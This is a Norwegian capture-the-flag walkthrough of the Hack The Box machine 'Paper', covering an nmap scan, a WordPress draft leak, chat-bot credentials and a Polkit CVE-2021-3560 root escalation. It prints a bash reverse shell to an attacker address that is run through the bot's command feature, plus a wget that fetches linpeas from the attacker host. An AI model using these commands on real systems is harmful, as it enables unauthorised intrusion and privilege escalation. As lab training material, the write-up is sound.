# HTB - Paper
Det første vi gjør er å kjøre nmap.

```
nmap -sV -sC xx.xx.xx.xx > nmap.txt
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-title: HTTP Server Test Page powered by CentOS
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-title: HTTP Server Test Page powered by CentOS
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
```

Nettsiden ser relativt tomt ut, jeg scanner siden med både gobuster og nikto. Der finner jeg en dns server som heter office.paper.

Jeg legger til den i /etc/hosts. Jeg scanner da den nettsiden videre med gobuster og ser at det er en wordpress server og bruker da wpscan til å sjekke siden for flere hull. Da ser vi at den bruker <b>Wordpress 5.2.3</b>. Og etter en kjapp google search finner vi at den har en <a href="https://www.exploit-db.com/exploits/47361">svakhet</a> for å se på tidligere drafts i nettsiden. ved å legge til ?static=1 får vi relativt kritisk informasjon som skaperen av nettsiden har lagt ut hensynsløst.
<p>Dette er da enda en DNS server, som vi kan legge til i /etc/hosts.
  
  ```
  Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt….

# Secret Registration URL of new Employee chat system

http://chat.office.paper/register/8qozr226AhkCHZdyY

# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.

# Also, stop looking at my drafts. Jeez!
  ```
  
Denne siden lar oss lage en bruker. Dette er da et chatterom for ansatte hos Paper. Han som driver nettsiden har laget en bot som henter ut filer fra pcen sin, veldig flott ide...(sarkastisk). Etter litt graving i filene finner jeg:
  
```
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
  ```
  
I dette tilfelle var det ikke brukbart med det brukernavnet eller passordet, det jeg finner videre er at det ligger skjulte kommandoer i /hubot directory.
Der finnes det en kommando som heter run, som basicly kjører en kommando i console på linux. Det jeg gjør da er å gjøre et reverse shell med /bin/bash.
  
  ```
  /bin/bash -i >& /dev/tcp/xx.xx.xx.xx/1111 0>&1
  ```
  Deretter spawner jeg et shell med python: python3 -c 'import pty; pty.spawn("/bin/sh")'
  Og vipps vi har user flagg.
  
  <h2>root</h2>
  Jeg overfører linpeas via python webserver og kjører følgende kommandoer:
  
  ```
  wget xx.xx.xx.xx/linpeas.sh
  chmod +x linpeas.sh
  ./linpeas.sh
  ```
  !!NB: viktig å kjøre den mest oppdaterte versjonen av linpeas!!
  <p>Denne serveren har <a href="https://access.redhat.com/security/cve/cve-2021-3560">CVE-2021-3560</a></p>
  Dette angrepet baserer seg på ren timing så exploiten må kjøres flere ganger før det fungerer. Hvordan det fungerer kan leses <a href="https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation">her.</a> Etter en 5+ ganger kjøring av exploiten så har vi injektert en bruker med tilgang til sudo og vi får root.
